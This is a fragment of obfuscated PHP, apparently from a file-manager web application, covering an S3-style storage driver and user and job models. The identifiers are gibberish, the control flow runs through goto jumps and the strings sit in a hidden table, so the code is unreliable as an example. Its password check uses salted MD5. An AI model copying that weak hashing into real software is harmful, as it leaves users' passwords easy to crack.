$this->client->putObjectFile($bè÷ñ°‰„İ, $this->bucket, $E—…›ÖéÛø, $eÑğ‹£ÃÑ[200], $cÊ¤‹¨»ƒ, $cœã‰›­›); return !empty($Fèä²„‹–¾) ? $this->getPathOuter($E—…›ÖéÛø) : !1; } $d£³ÒÅÉâ± = $this->client->multiUploadObject($bè÷ñ°‰„İ, $this->bucket, trim($E—…›ÖéÛø, $eÑğ‹£ÃÑ[8]), $cÊ¤‹¨»ƒ, $cœã‰›­›); return $d£³ÒÅÉâ± ? $this->getPathOuter($E—…›ÖéÛø) : !1; } public function download($dĞ¥İÎƒ„, $e’ ‘ÚÍ›Ç) { if (!@is_dir($this->pathFather($e’ ‘ÚÍ›Ç)) && !IO::mkdir($this->pathFather($e’ ‘ÚÍ›Ç))) { return !1; } $C¶À°ª„±í = $this->client->getObject($this->bucket, $dĞ¥İÎƒ„, array(), $e’ ‘ÚÍ›Ç); return $C¶À°ª„±í !== !1 ? $e’ ‘ÚÍ›Ç : !1; } public function link($F¨ùğÖè’, $EÉ­ÇŒ·è„ = array()) { $a¢º¤‚æÅ» =& $_SERVER[í¤âËÚ£¶íÊ¢]; if ($this->signVer == $a¢º¤‚æÅ»[220]) { return $this->client->getAuthenticatedURL($this->bucket, $F¨ùğÖè’, 3600 * 12, $EÉ­ÇŒ·è„); } return $this->client->getObjectUrl($this->accessKey, $this->secret, $this->bucket, trim($F¨ùğÖè’, $a¢º¤‚æÅ»[8]), 3600 * 12, $this->region, array(), !0, $EÉ­ÇŒ·è„); } public function fileOut($D‰ÍˆÁªèÏ, $BÍğÅñµº = false, $A‹Í‡–™  = false, $bÕ¬ÛÇ»ôÀ = '') { goto e“”¨…Äô; Cìö¯¦Ş¢ø: $fŠù›ÄÌ´Õ = get_file_mime(get_path_ext($A‹Í‡–™ )); if ($fŠù›ÄÌ´Õ == $Eõôºá’¬…[221]) { return parent::fileOut($D‰ÍˆÁªèÏ, $BÍğÅñµº, $A‹Í‡–™ , $bÕ¬ÛÇ»ôÀ); } $BÍğÅñµº = $BÍğÅñµº ? $Eõôºá’¬…[222] : $Eõôºá’¬…[223]; goto BõéƒëŞ¡±; e“”¨…Äô: $Eõôºá’¬… =& $_SERVER[í¤âËÚ£¶íÊ¢]; if ($this->isFileOutServer()) { return $this->fileOutServer($D‰ÍˆÁªèÏ, $BÍğÅñµº, $A‹Í‡–™ , $bÕ¬ÛÇ»ôÀ); } if (!$A‹Í‡–™ ) { $A‹Í‡–™  = $this->pathThis($D‰ÍˆÁªèÏ); } goto Cìö¯¦Ş¢ø; BõéƒëŞ¡±: $aÉôŞñä˜Ä = array($Eõôºá’¬…[224] => $BÍğÅñµº . $Eõôºá’¬…[225] . rawurlencode($A‹Í‡–™ ), $Eõôºá’¬…[226] => $fŠù›ÄÌ´Õ); $DÊÏÔ¤Ã´í = $this->link($D‰ÍˆÁªèÏ, $aÉôŞñä˜Ä); $this->fileOutLink($DÊÏÔ¤Ã´í); goto D¢Î«† “; D¢Î«† “: } public function fileOutServer($eŒ„¥Éëä, $FÚĞ£¬Øµ† = false, $A¸É÷»¨—Ş = false, $Aš¤’î¹¡ø = '') { parent::fileOut($eŒ„¥Éëä, $FÚĞ£¬Øµ†, $A¸É÷»¨—Ş, $Aš¤’î¹¡ø); } public function fileOutImageServer($Fœ¶Äµ¸Ä¶, $B„£¶ƒÀÉ¦ = 250) { parent::fileOutImage($Fœ¶Äµ¸Ä¶, $B„£¶ƒÀÉ¦); } public function hashMd5($d¾çÍ¶Å§¶, $fÂªõ¬¹»Ä = '') { $e¢Á²Ô«´Ø =& $_SERVER[í¤âËÚ£¶íÊ¢]; $a×İ½†ùÚÕ = $this->objectMeta($d¾çÍ¶Å§¶); if (!$a×İ½†ùÚÕ) { return !1; } $fÂªõ¬¹»Ä = $fÂªõ¬¹»Ä ? $fÂªõ¬¹»Ä : _get($a×İ½†ùÚÕ, $e¢Á²Ô«´Ø[227]); $fÂªõ¬¹»Ä = $fÂªõ¬¹»Ä ? $fÂªõ¬¹»Ä : _get($a×İ½†ùÚÕ, $e¢Á²Ô«´Ø[217], $e¢Á²Ô«´Ø[33]); return $fÂªõ¬¹»Ä; } public function uploadFormData($féÕ¤ñ’‘ä, $aÁç†¸ĞäÈ = 3600) { $B“»šˆµ“· =& $_SERVER[í¤âËÚ£¶íÊ¢]; $B¡Ô†ì‘×’ = $this->pathFather($féÕ¤ñ’‘ä); $a•ë³šö‘Ü = $this->client->getHttpUploadPostParams($this->bucket, $B¡Ô†ì‘×’, $B“»šˆµ“·[200], $aÁç†¸ĞäÈ); return array_merge((array) $a•ë³šö‘Ü, array($B“»šˆµ“·[184] => $this->getHost())); } public function multiUploadFormData($B…Èó¡Å¾ß, $D‰°àáâŒ = 3600) { $a‘‚ƒ°ßæ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $fé¶‹ÀíÇ¾ = gmdate($a‘‚ƒ°ßæ[228]); $CÚ«¿‡…ø© = array(); $c–Ş¬âÎÅ˜ = $this->client->getUploadId($this->bucket, $B…Èó¡Å¾ß, $CÚ«¿‡…ø©); if (!$c–Ş¬âÎÅ˜) { return !1; } return array($a‘‚ƒ°ßæ[229] => $c–Ş¬âÎÅ˜, $a‘‚ƒ°ßæ[184] => $this->getHost() . $a‘‚ƒ°ßæ[8] . $this->pathEncode($B…Èó¡Å¾ß), $a‘‚ƒ°ßæ[230] => $fé¶‹ÀíÇ¾, $a‘‚ƒ°ßæ[102] => $B…Èó¡Å¾ß); } public function multiUploadAuthData($bòÎõØÑì, $bÑøâ‡£ÆÌ = array()) { goto DòöœÆÅ”´; DòöœÆÅ”´: $AêˆÌ½î‘Œ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $CŠÂŒÌ¹Ş‹ = isset($bÑøâ‡£ÆÌ[$AêˆÌ½î‘Œ[230]]) ? $bÑøâ‡£ÆÌ[$AêˆÌ½î‘Œ[230]] : gmdate($AêˆÌ½î‘Œ[228]); $CâÀÆÁ‡±Å = isset($bÑøâ‡£ÆÌ[$AêˆÌ½î‘Œ[177]]) ? $bÑøâ‡£ÆÌ[$AêˆÌ½î‘Œ[177]] : $AêˆÌ½î‘Œ[33]; goto F½»å¥ÖÍ; A¯–Ú°ÕÛÕ: $aÚª…Èê³ = array($AêˆÌ½î‘Œ[232], $AêˆÌ½î‘Œ[33], $AêˆÌ½î‘Œ[128], $AêˆÌ½î‘Œ[33], "\x78\55\x61\x6d\172\55\144\x61\164\145\72{$CŠÂŒÌ¹Ş‹}", $AêˆÌ½î‘Œ[8] . $this->bucket . $AêˆÌ½î‘Œ[8] . $this->pathEncode($d­éàˆ«¼˜) . $CâÀÆÁ‡±Å); if (strpos($CâÀÆÁ‡±Å, $AêˆÌ½î‘Œ[233]) === 0) { $aÚª…Èê³[0] = $AêˆÌ½î‘Œ[234]; } if (isset($bÑøâ‡£ÆÌ[$AêˆÌ½î‘Œ[235]]) && $bÑøâ‡£ÆÌ[$AêˆÌ½î‘Œ[235]] == $AêˆÌ½î‘Œ[236]) { $aÚª…Èê³[0] = $AêˆÌ½î‘Œ[236]; } goto aòÙ¨ñØ†; aòÙ¨ñØ†: $F×‰çÂœÅ = implode($AêˆÌ½î‘Œ[63], $aÚª…Èê³); $e›ÀäªÚãÇ = base64_encode(hash_hmac($AêˆÌ½î‘Œ[237], $F×‰çÂœÅ, $this->secret, !0)); $Bñ¨‚Ø§Œ = $AêˆÌ½î‘Œ[238] . $this->accessKey . $AêˆÌ½î‘Œ[4] . $e›ÀäªÚãÇ; goto b…¨“ßÈ÷…; b…¨“ßÈ÷…: if (strpos($CâÀÆÁ‡±Å, $AêˆÌ½î‘Œ[233]) === 0) { return array($AêˆÌ½î‘Œ[239] => $Bñ¨‚Ø§Œ, $AêˆÌ½î‘Œ[230] => $CŠÂŒÌ¹Ş‹); } return $Bñ¨‚Ø§Œ; goto FºÄö»Ãæ; F½»å¥ÖÍ: $d­éàˆ«¼˜ = $bÑøâ‡£ÆÌ[$AêˆÌ½î‘Œ[102]]; unset($bÑøâ‡£ÆÌ[$AêˆÌ½î‘Œ[102]]); if (isset($bÑøâ‡£ÆÌ[$AêˆÌ½î‘Œ[231]])) { $bÑøâ‡£ÆÌ[$AêˆÌ½î‘Œ[230]] = $CŠÂŒÌ¹Ş‹; return $this->listUploadParts($d­éàˆ«¼˜, $bÑøâ‡£ÆÌ); } goto A¯–Ú°ÕÛÕ; FºÄö»Ãæ: } public function listUploadParts($b¼å£‹Ï”µ, $Fì±¥ãË•× = array()) { goto BÙƒå¼šª; BÙƒå¼šª: $EŠ¡¿ÔÆê© =& $_SERVER[í¤âËÚ£¶íÊ¢]; $b×¢æ òéá = str_replace($EŠ¡¿ÔÆê©[240], $EŠ¡¿ÔÆê©[33], $Fì±¥ãË•×[$EŠ¡¿ÔÆê©[177]]); $BâµÀÃôÙŞ = $this->client->listParts($this->bucket, $b¼å£‹Ï”µ, $b×¢æ òéá); goto aïãÙŸïè¹; aïãÙŸïè¹: if (!$BâµÀÃôÙŞ) { return !1; } unset($Fì±¥ãË•×[$EŠ¡¿ÔÆê©[231]], $Fì±¥ãË•×[$EŠ¡¿ÔÆê©[235]]); $Fì±¥ãË•×[$EŠ¡¿ÔÆê©[102]] = $b¼å£‹Ï”µ; goto bÀÁªà†Ç‰; bÀÁªà†Ç‰: $bˆğ²‰¿µ„ = $this->multiUploadAuthData($b¼å£‹Ï”µ, $Fì±¥ãË•×); if (empty($bˆğ²‰¿µ„)) { return !1; } return array($EŠ¡¿ÔÆê©[239] => $bˆğ²‰¿µ„, $EŠ¡¿ÔÆê©[230] => $Fì±¥ãË•×[$EŠ¡¿ÔÆê©[230]], $EŠ¡¿ÔÆê©[241] => $BâµÀÃôÙŞ); goto C¾ÇŸø•„¼; C¾ÇŸø•„¼: } public function getHost() { return parent::getHost() . $_SERVER[í¤âËÚ£¶íÊ¢][8] . $this->bucket; } public function size($f÷Úéª‡Æ¨) { $c¸ÆÕîäÖÁ = $this->objectMeta($f÷Úéª‡Æ¨); return $c¸ÆÕîäÖÁ ? $c¸ÆÕîäÖÁ[$_SERVER[í¤âËÚ£¶íÊ¢][87]] : 0; } public function info($a¦±éÇÑšŠ) { if ($this->isFolder($a¦±éÇÑšŠ)) { return $this->folderInfo($a¦±éÇÑšŠ); } else { if ($this->isFile($a¦±éÇÑšŠ)) { return $this->fileInfo($a¦±éÇÑšŠ); } } return !1; } public function exist($fßÂÁ¼»é) { return $this->isFile($fßÂÁ¼»é) || $this->isFolder($fßÂÁ¼»é); } public function isFile($aßíŒŠ…½ß) { return !$this->isFolder($aßíŒŠ…½ß) && $this->objectMeta($aßíŒŠ…½ß); } public function isFolder($fšæ‰ŒĞ) { return $this->cacheMethod($_SERVER[í¤âËÚ£¶íÊ¢][207], $fšæ‰ŒĞ); } protected function objectMeta($EÔ£–å”Äè) { return $this->cacheMethod($_SERVER[í¤âËÚ£¶íÊ¢][208], $EÔ£–å”Äè); } protected function _objectMeta($eÅº”ÒÉ®) { $Dç‘Œ°†ŒÛ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $eÅº”ÒÉ® = rtrim($eÅº”ÒÉ®, $Dç‘Œ°†ŒÛ[8]); try { $d™Œï‚ÒŠÑ = $this->client->getObjectInfo($this->bucket, $eÅº”ÒÉ®); if (!isset($d™Œï‚ÒŠÑ[$Dç‘Œ°†ŒÛ[227]]) && isset($d™Œï‚ÒŠÑ[$Dç‘Œ°†ŒÛ[242]])) { $d™Œï‚ÒŠÑ[$Dç‘Œ°†ŒÛ[227]] = $d™Œï‚ÒŠÑ[$Dç‘Œ°†ŒÛ[242]]; } } catch (Exception $e¹è£‚Îé¶) { $d™Œï‚ÒŠÑ = !1; } if (!$d™Œï‚ÒŠÑ) { } return $d™Œï‚ÒŠÑ; } protected function _isFolder($CÊÃ­Š¦çö) { goto aà¼££³µÌ; eöáÈß¼„ç: $cŒäò‡Ù˜ = $this->client->getBucket($this->bucket, $CÊÃ­Š¦çö, null, 1); if (empty($cŒäò‡Ù˜[$e±Ö·ğ†Ñ´[206]])) { return !1; } $D¢ò¾¨„Šå = $cŒäò‡Ù˜[$e±Ö·ğ†Ñ´[206]][0][$e±Ö·ğ†Ñ´[28]]; goto EöÎ¤Í™Ğª; EöÎ¤Í™Ğª: if (substr($D¢ò¾¨„Šå, -1) == $e±Ö·ğ†Ñ´[8]) { return !0; } if (get_path_this($D¢ò¾¨„Šå) == get_path_this($CÊÃ­Š¦çö)) { return !1; } return !0; goto B°Ä¹˜…­; aà¼££³µÌ: $e±Ö·ğ†Ñ´ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $CÊÃ­Š¦çö = rtrim($CÊÃ­Š¦çö, $e±Ö·ğ†Ñ´[8]); if ($CÊÃ­Š¦çö == $e±Ö·ğ†Ñ´[33] || $CÊÃ­Š¦çö == $e±Ö·ğ†Ñ´[8]) { return !0; } goto eöáÈß¼„ç; B°Ä¹˜…­: } } define($_SERVER[í¤âËÚ£¶íÊ¢][243], 1); goto b®‘ïÛÓ; fÂÏ×¨Œ‡›: class UserJobModel extends ModelBaseLight { public $optionType = "\123\x79\x73\x74\x65\155\56\x6a\x6f\x62\x4c\151\163\x74"; public $field = array("\x6e\141\x6d\x65", "\144\x65\x73\x63", "\163\157\x72\164"); const JOB_KEY = "\163\145\154\146\x4a\157\142\x4c\x69\163\x74"; public function listData($F±ùİÃ¢”Æ = false, $B¿‹‘‡Œñ = "\x73\x6f\x72\x74", $dİî¯›×ºá = false) { return parent::listData($F±ùİÃ¢”Æ, $B¿‹‘‡Œñ, $dİî¯›×ºá); } public function remove($bàŒôê‡“Ğ) { return parent::remove($bàŒôê‡“Ğ); } public function add($FİŠâ¡…) { $AÓ¶À¼İ‹á =& $_SERVER[í¤âËÚ£¶íÊ¢]; if ($this->findByName($FİŠâ¡…[$AÓ¶À¼İ‹á[28]])) { return !1; } $FİŠâ¡…[$AÓ¶À¼İ‹á[1673]] = $this->getSort(); return parent::insert($FİŠâ¡…); } private function getSort() { $A¹ÖÛ³™î =& $_SERVER[í¤âËÚ£¶íÊ¢]; $BáŞ¤Éæ·¸ = parent::listData(); $B©éÌ”ààˆ = array_to_keyvalue($BáŞ¤Éæ·¸, $A¹ÖÛ³™î[33], $A¹ÖÛ³™î[1673]); return empty($B©éÌ”ààˆ) ? 0 : max($B©éÌ”ààˆ) + 1; } public function update($e•×š´ŠÕ¥, $A”ğàØØğ) { $b—ƒ£¢éÎ… =& $_SERVER[í¤âËÚ£¶íÊ¢]; $bËìßï‘Ì = parent::listData($e•×š´ŠÕ¥); $EÌ‚Á×…£” = $this->findByName($A”ğàØØğ[$b—ƒ£¢éÎ…[28]]); if (!$bËìßï‘Ì || $EÌ‚Á×…£” && $EÌ‚Á×…£”[$b—ƒ£¢éÎ…[397]] != $bËìßï‘Ì[$b—ƒ£¢éÎ…[397]]) { return !1; } return parent::update($e•×š´ŠÕ¥, $A”ğàØØğ); } public function setUserJob($F¾…ÏÍ•Ğ, $Cé–¤Ÿ¯ïĞ) { goto b¥œª±´óÕ; b¥œª±´óÕ: $D‹™’îêòí =& $_SERVER[í¤âËÚ£¶íÊ¢]; if (!is_array($Cé–¤Ÿ¯ïĞ)) { $Cé–¤Ÿ¯ïĞ = array($Cé–¤Ÿ¯ïĞ); } $Dõçî‹ÊÉ = parent::listData(); goto bÄˆöŸ„ì; e¦ºµè Ö„: $CùÂ²„º»É = rtrim($CùÂ²„º»É, $D‹™’îêòí[47]); Model($D‹™’îêòí[510])->metaSet($F¾…ÏÍ•Ğ, self::JOB_KEY, $CùÂ²„º»É); goto EÆØ®‰Ê÷œ; bÄˆöŸ„ì: $B¿¯¸—•… = array_to_keyvalue($Dõçî‹ÊÉ, $D‹™’îêòí[28]); $CùÂ²„º»É = $D‹™’îêòí[360]; foreach ($Cé–¤Ÿ¯ïĞ as $f™—«ì’’ª) { if ($B¿¯¸—•…[$f™—«ì’’ª]) { $CùÂ²„º»É .= $B¿¯¸—•…[$f™—«ì’’ª][$D‹™’îêòí[397]] . $D‹™’îêòí[47]; } else { $Fæ§œ— = $this->add($f™—«ì’’ª); $CùÂ²„º»É .= $Fæ§œ— . $D‹™’îêòí[47]; } } goto e¦ºµè Ö„; EÆØ®‰Ê÷œ: } public function getUserJob($e×Äìâ×Í) { $AİÆ’¡î¥Ş = Model($_SERVER[í¤âËÚ£¶íÊ¢][510])->metaGet($e×Äìâ×Í); return $this->getUserJobInfo($AİÆ’¡î¥Ş[self::JOB_KEY]); } public function getUserJobInfo($d¯¾İº½ ã) { goto EÚˆ»éœºÌ; Fê¬ÛŞ¡èŸ: return $B¸ÛÎÁ¿„É; goto BíƒÅÈÄ©¥; EÚˆ»éœºÌ: $EÒÎ·´ß¸æ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $BÖ©²ğ¼öø = explode($EÒÎ·´ß¸æ[47], $d¯¾İº½ ã); $b´¾¨•İ¼ö = parent::listData(); goto D†¦ÚÜ¢‚; D†¦ÚÜ¢‚: $b´¾¨•İ¼ö = array_remove_key($b´¾¨•İ¼ö, $EÒÎ·´ß¸æ[202]); $B¸ÛÎÁ¿„É = array(); foreach ($BÖ©²ğ¼öø as $a×çÙÓÇ) { if (isset($b´¾¨•İ¼ö[$a×çÙÓÇ])) { $B¸ÛÎÁ¿„É[] = $b´¾¨•İ¼ö[$a×çÙÓÇ]; } } goto Fê¬ÛŞ¡èŸ; BíƒÅÈÄ©¥: } } class UserModel extends ModelBase { protected $tableName = "\165\163\x65\162"; protected $tableMeta = array("\x74\x61\142\x6c\x65\x4e\x61\155\x65" => "\x75\x73\145\162\137\155\145\164\x61", "\x6d\145\164\141\106\151\x65\x6c\144" => "\165\163\145\162\x49\x44"); protected $simpleField = "\165\163\x65\162\x49\x44\x2c\156\151\143\153\x4e\x61\x6d\x65\54\156\x61\155\145\54\x61\166\141\x74\141\162\54\163\145\x78"; const ERROR_USER_NOT_EXISTS = -1; const ERROR_USER_PASSWORD_ERROR = -2; const ERROR_USER_EXIST_NAME = -3; const ERROR_USER_EXIST_PHONE = -4; const ERROR_USER_EXIST_EMAIL = -5; const ERROR_USER_LOGIN_LOCK = -6; const ERROR_IP_NOT_ALLOW = -7; const ERROR_USER_EXIST_NICKNAME = -8; protected function cacheFunctionAlias($b²Ö„Á¶©Í) { $E÷ï¨…Í¥² =& $_SERVER[í¤âËÚ£¶íÊ¢]; $E¸Î®ã—…Ï = $E÷ï¨…Í¥²[2071]; return array($E÷ï¨…Í¥²[1721] => array($b²Ö„Á¶©Í[0], $E¸Î®ã—…Ï), $E÷ï¨…Í¥²[1723] => array($b²Ö„Á¶©Í[0], $E¸Î®ã—…Ï), $E÷ï¨…Í¥²[2072] => array($b²Ö„Á¶©Í[0], $E¸Î®ã—…Ï)); } protected function getInfo($cƒˆé¢ğÅ, $a­«Ó×¡æ” = false) { $dİ‹—¼Ô…¹ = $this->getInfoSimple($cƒˆé¢ğÅ); if (!is_array($dİ‹—¼Ô…¹)) { return array(); } if ($a­«Ó×¡æ”) { return $this->_getInfoApply($dİ‹—¼Ô…¹); } return $this->cacheFunctionGet($_SERVER[í¤âËÚ£¶íÊ¢][1730], $cƒˆé¢ğÅ); } protected function getInfoFull($båí­Ã·Ëã, $aŒ…¡ù”Ïå = false) { $C’ÎÆÖ— = $this->getInfoSimple($båí­Ã·Ëã); if (!is_array($C’ÎÆÖ—)) { return array(); } if ($aŒ…¡ù”Ïå) { return $this->_getInfoApply($C’ÎÆÖ—, !0); return $this->_getInfoApply($C’ÎÆÖ—, !0); } return $this->cacheFunctionGet($_SERVER[í¤âËÚ£¶íÊ¢][2073], $båí­Ã·Ëã); } private function _getInfoApply($dšß¦¸Ü¤Ø, $EÏ‰Òñ§öÓ = false) { goto eëèˆíÙ¿‰; cˆš¢ãµ—Õ: $dšß¦¸Ü¤Ø = $this->_listDataApplyItem($dšß¦¸Ü¤Ø); $cÑÑ­ƒ„ = Model($E ÷µ±‰Â«[1164])->metaGet($dšß¦¸Ü¤Ø[$E ÷µ±‰Â«[94]][$E ÷µ±‰Â«[399]]); $dšß¦¸Ü¤Ø[$E ÷µ±‰Â«[2076]] = $aÆƒ¨ˆ³í‚; goto CäùªäÍ±Ñ; CäùªäÍ±Ñ: $dšß¦¸Ü¤Ø[$E ÷µ±‰Â«[94]][$E ÷µ±‰Â«[1911]] = isset($cÑÑ­ƒ„[$E ÷µ±‰Â«[1912]]) ? $cÑÑ­ƒ„[$E ÷µ±‰Â«[1912]] : null; if ($EÏ‰Òñ§öÓ) { $dšß¦¸Ü¤Ø[$E ÷µ±‰Â«[448]] = $this->metaGet($dšß¦¸Ü¤Ø[$E ÷µ±‰Â«[1487]]); } return $dšß¦¸Ü¤Ø; goto EÛÇÀÕÌ¹Ã; eëèˆíÙ¿‰: $E ÷µ±‰Â« =& $_SERVER[í¤âËÚ£¶íÊ¢]; if (!$dšß¦¸Ü¤Ø) { return $dšß¦¸Ü¤Ø; } $aÆƒ¨ˆ³í‚ = md5($E ÷µ±‰Â«[2074] . $dšß¦¸Ü¤Ø[$E ÷µ±‰Â«[810]] . $E ÷µ±‰Â«[2075] . $dšß¦¸Ü¤Ø[$E ÷µ±‰Â«[28]]); goto cˆš¢ãµ—Õ; EÛÇÀÕÌ¹Ã: } protected function getInfoSimple($d¹ò‰ËŠŒ, $bÍñâ¦†Ú = false) { $D±¢›’¯ÓŠ =& $_SERVER[í¤âËÚ£¶íÊ¢]; if (!$d¹ò‰ËŠŒ) { return array(); } if ($bÍñâ¦†Ú) { $A÷°Š•İÔ = $this->where(array($D±¢›’¯ÓŠ[1487] => intval($d¹ò‰ËŠŒ)))->find(); if (!is_array($A÷°Š•İÔ)) { return array(); } $A÷°Š•İÔ[$D±¢›’¯ÓŠ[2077]] = Action($D±¢›’¯ÓŠ[2078])->parseUrl($A÷°Š•İÔ[$D±¢›’¯ÓŠ[2077]]); return $A÷°Š•İÔ; } return $this->cacheFunctionGet($D±¢›’¯ÓŠ[1724], $d¹ò‰ËŠŒ); } protected function getInfoSimpleOuter($båÁªšÜ¥) { goto C¸¶Ş¾ª³; b öŸ£¹Ğ: return $bóÒ‚ã«…±; goto cŞ°ùÆÄø; A½ˆ†â¢ìÍ: $bóÒ‚ã«…± = array_field_key($BÊœã·‘µ¿, explode($b…Ââ‹Æ‘Š[47], $this->simpleField)); if (!$bóÒ‚ã«…±) { return array($b…Ââ‹Æ‘Š[1487] => $b…Ââ‹Æ‘Š[1045], $b…Ââ‹Æ‘Š[28] => $b…Ââ‹Æ‘Š[169] . LNG($b…Ââ‹Æ‘Š[2081]) . $b…Ââ‹Æ‘Š[508], $b…Ââ‹Æ‘Š[2077] => STATIC_PATH . $b…Ââ‹Æ‘Š[2082]); } $bóÒ‚ã«…±[$b…Ââ‹Æ‘Š[2077]] = Action($b…Ââ‹Æ‘Š[2078])->parseUrl($bóÒ‚ã«…±[$b…Ââ‹Æ‘Š[2077]]); goto b öŸ£¹Ğ; C¸¶Ş¾ª³: $b…Ââ‹Æ‘Š =& $_SERVER[í¤âËÚ£¶íÊ¢]; if (!$båÁªšÜ¥ || $båÁªšÜ¥ == 0) { return array($b…Ââ‹Æ‘Š[1487] => $b…Ââ‹Æ‘Š[500], $b…Ââ‹Æ‘Š[28] => $b…Ââ‹Æ‘Š[169] . LNG($b…Ââ‹Æ‘Š[2079]) . $b…Ââ‹Æ‘Š[508], $b…Ââ‹Æ‘Š[2077] => STATIC_PATH . $b…Ââ‹Æ‘Š[2080]); } $BÊœã·‘µ¿ = $this->cacheFunctionGet($b…Ââ‹Æ‘Š[1724], $båÁªšÜ¥); goto A½ˆ†â¢ìÍ; cŞ°ùÆÄø: } protected function groupUser($a§•¯ÚùÈù) { } public static function errorLang($cÀ¹˜­’àé) { $eìôÆôº–Ô =& $_SERVER[í¤âËÚ£¶íÊ¢]; $BŸÄÇñõ‚¤ = array(self::ERROR_USER_NOT_EXISTS => $eìôÆôº–Ô[2083], self::ERROR_USER_PASSWORD_ERROR => $eìôÆôº–Ô[2084], self::ERROR_USER_EXIST_NAME => $eìôÆôº–Ô[2085], self::ERROR_USER_EXIST_PHONE => $eìôÆôº–Ô[2086], self::ERROR_USER_EXIST_EMAIL => $eìôÆôº–Ô[2087], self::ERROR_USER_LOGIN_LOCK => $eìôÆôº–Ô[2088], self::ERROR_IP_NOT_ALLOW => $eìôÆôº–Ô[2089], self::ERROR_USER_EXIST_NICKNAME => $eìôÆôº–Ô[2090]); return LNG($BŸÄÇñõ‚¤[$cÀ¹˜­’àé]); } public function getInfoByMeta($B¥¸äí”, $b‡ùâ’) { $c²×”ë‘É =& $_SERVER[í¤âËÚ£¶íÊ¢]; $Dù­œÏ——ã = Model($c²×”ë‘É[2091])->where(array($c²×”ë‘É[102] => $B¥¸äí”, $c²×”ë‘É[380] => $b‡ùâ’))->find(); if ($Dù­œÏ——ã) { return $this->getInfo($Dù­œÏ——ã[$c²×”ë‘É[1487]]); } return !1; } public function userLoginCheck($A·“õôÓò, $b­İ˜‘Ô) { $a®®÷ÛŠ‚é =& $_SERVER[í¤âËÚ£¶íÊ¢]; $FÁåÈİ = $this->userLoginFind($A·“õôÓò); if (!$FÁåÈİ) { return UserModel::ERROR_USER_NOT_EXISTS; } if (!$this->userPasswordCheck($FÁåÈİ[$a®®÷ÛŠ‚é[1487]], $b­İ˜‘Ô)) { return UserModel::ERROR_USER_PASSWORD_ERROR; } return $this->getInfo($FÁåÈİ[$a®®÷ÛŠ‚é[1487]]); } public function userLoginFind($b·ÖÉ¡ª…Ö) { $e§ø–´ßÛĞ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $C•¤ì‡è = array($e§ø–´ßÛĞ[28] => $b·ÖÉ¡ª…Ö, $e§ø–´ßÛĞ[1915] => $b·ÖÉ¡ª…Ö, $e§ø–´ßÛĞ[310] => $b·ÖÉ¡ª…Ö, $e§ø–´ßÛĞ[2092] => $b·ÖÉ¡ª…Ö, $e§ø–´ßÛĞ[918] => $e§ø–´ßÛĞ[920]); if ($this->nickNameRpt()) { unset($C•¤ì‡è[$e§ø–´ßÛĞ[1915]]); } return $this->where($C•¤ì‡è)->find(); } public function clearCache($B‰¢Ñ½†‘) { $d¥Î˜Õ¾‰ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $this->cacheFunctionClear($d¥Î˜Õ¾‰[1730], $B‰¢Ñ½†‘); $this->cacheFunctionClear($d¥Î˜Õ¾‰[1724], $B‰¢Ñ½†‘); $this->cacheFunctionClear($d¥Î˜Õ¾‰[2073], $B‰¢Ñ½†‘); } public function userPasswordCheck($e’Åšø„, $eÒ¦­¿µçÜ) { $F¹¢ÅÙ–…¨ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $eå®ãŞÀ = $this->where(array($F¹¢ÅÙ–…¨[1487] => intval($e’Åšø„)))->find(); $e»­¸‰­­„ = $this->metaGet($e’Åšø„); $F£Àœå°ˆÁ = isset($e»­¸‰­­„[$F¹¢ÅÙ–…¨[2093]]) ? $e»­¸‰­­„[$F¹¢ÅÙ–…¨[2093]] : $F¹¢ÅÙ–…¨[33]; if (md5($F£Àœå°ˆÁ . trim($eÒ¦­¿µçÜ)) !== $eå®ãŞÀ[$F¹¢ÅÙ–…¨[810]]) { return !1; } return !0; } public function userAdd($FóÅ‡åÑš·) { goto Bß®ôÁ™àƒ; AÊÄğªÅƒ§: $C•ÜäÆ¨Ë» = $this->_checkExist($FóÅ‡åÑš·); if ($C•ÜäÆ¨Ë» !== !0) { return $C•ÜäÆ¨Ë»; } $bßˆ¶©«Œ = $this->add($EÓÙØ¥Õõ); goto Fåùö‘¸øÅ; Bß®ôÁ™àƒ: $AœéÊöÑŠ¾ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $EÓÙØ¥Õõ = array($AœéÊöÑŠ¾[416] => $FóÅ‡åÑš·[$AœéÊöÑŠ¾[28]], $AœéÊöÑŠ¾[2094] => $FóÅ‡åÑš·[$AœéÊöÑŠ¾[1372]], $AœéÊöÑŠ¾[2095] => isset($FóÅ‡åÑš·[$AœéÊöÑŠ¾[310]]) ? $FóÅ‡åÑš·[$AœéÊöÑŠ¾[310]] : $AœéÊöÑŠ¾[33], $AœéÊöÑŠ¾[2096] => isset($FóÅ‡åÑš·[$AœéÊöÑŠ¾[2092]]) ? $FóÅ‡åÑš·[$AœéÊöÑŠ¾[2092]] : $AœéÊöÑŠ¾[33], $AœéÊöÑŠ¾[2097] => isset($FóÅ‡åÑš·[$AœéÊöÑŠ¾[1915]]) ? $FóÅ‡åÑš·[$AœéÊöÑŠ¾[1915]] : $FóÅ‡åÑš·[$AœéÊöÑŠ¾[28]], $AœéÊöÑŠ¾[2098] => isset($FóÅ‡åÑš·[$AœéÊöÑŠ¾[2077]]) ? $FóÅ‡åÑš·[$AœéÊöÑŠ¾[2077]] : $AœéÊöÑŠ¾[33], $AœéÊöÑŠ¾[2099] => isset($FóÅ‡åÑš·[$AœéÊöÑŠ¾[2100]]) ? $FóÅ‡åÑš·[$AœéÊöÑŠ¾[2100]] : 1, $AœéÊöÑŠ¾[2101] => $FóÅ‡åÑš·[$AœéÊöÑŠ¾[810]], $AœéÊöÑŠ¾[1725] => isset($FóÅ‡åÑš·[$AœéÊöÑŠ¾[1634]]) ? $FóÅ‡åÑš·[$AœéÊöÑŠ¾[1634]] : 1024 * 1024 * 20, $AœéÊöÑŠ¾[1726] => 0, $AœéÊöÑŠ¾[2102] => 0, $AœéÊöÑŠ¾[1769] => isset($FóÅ‡åÑš·[$AœéÊöÑŠ¾[694]]) ? $FóÅ‡åÑš·[$AœéÊöÑŠ¾[694]] : 1); if (!empty($FóÅ‡åÑš·[$AœéÊöÑŠ¾[1487]])) 